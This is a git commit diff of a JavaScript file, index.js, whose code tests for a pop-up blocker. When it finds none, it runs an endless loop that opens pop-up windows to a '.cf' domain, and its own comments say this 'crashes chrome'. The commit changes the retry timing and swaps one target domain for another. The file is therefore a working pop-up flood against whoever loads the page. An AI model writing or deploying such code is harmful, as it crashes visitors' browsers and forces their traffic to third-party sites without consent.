30715bfcd1f338fc770e43e4be14e8874d2b8186
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2019-04-25 08:12:51 -0400

    Update index.js

--- index.js
+++ index.js
@@ -12,13 +12,13 @@ function detectPopupBlocker() {
   if (!myTest) { // Tests for pop-up blocker ^
     setTimeout(function() {
       recursor();
-    }, 1300);
+    }, 2000);
     //Runs recursory code after 5000 millisecond delay ^ (crashes chrome)
   } else {
     myTest.close();
     while (true) {
       var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
-      var URL = "http://kplibrary.cf" + location.href;
+      var URL = "http://halllibrary.cf" + location.href;
       var win = window.open(URL, "_blank", strWindowFeatures);
       //If no pop-up blocker spams a shit ton of pop-ups
     }
